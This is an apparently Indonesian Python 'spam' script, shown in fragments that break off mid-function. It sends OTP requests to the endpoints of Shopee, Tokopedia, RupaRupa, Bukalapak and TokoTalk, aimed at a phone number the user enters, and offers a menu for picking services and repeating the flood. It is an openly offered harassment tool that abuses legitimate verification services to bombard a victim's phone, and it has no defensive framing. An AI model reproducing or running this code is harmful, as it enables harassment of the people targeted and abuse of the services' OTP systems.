...
class spam:
	...
	def spam(self):
		...
		if hasil.status_code == 200:
			return f'\x1b[92mSpam Shopee {self.nomer} \033[1;32mSuccess!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpam Shopee {self.nomer} \x1b[91mFail!'
	...
	def Tokopedia(self):
		...
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpam Tokopedia {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpam Tokopedia {self.nomer} {h}Success!'

	def ruparupa(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpam RupaRupa {self.nomer} {h}Success!'
		else:
			return f'\x1b[91mSpam RupaRupa {self.nomer} {m}Fail!'
	...
	def Bukalapak(self):
		...
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpam Bukalapak {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpam Bukalapak {self.nomer} {m}Fail!'
	def TokoTalk(self):
		...
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpam TokoTalk {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpam TokoTalk {self.nomer} {m}Fail!'
# ------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tMau ulangi lagi? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
...
def single():
	nomer=str(input(k+'\tNomor Whatsapp : '+h))
...
def main():
	...
	pil=str(input(b+'╚══'+m+'〙'+u+'Pilih Mode'+m+' ▶ '+h))
	if( pil == '1' or pil == '01'):
		single()
		...
		print(m+'             Kok gak pilih?')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'Semua (Trouble)\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'RupaRupa (Maintenance)\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'Shopee (Maintenance)\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Maintenance)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Bukalapak (Maintenance)\n'+b+'╠══════════════════════════════')
	while True:
		oy=str(input(b+'╚══'+m+'〙'+u+'Pilih Spam'+m+' ▶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
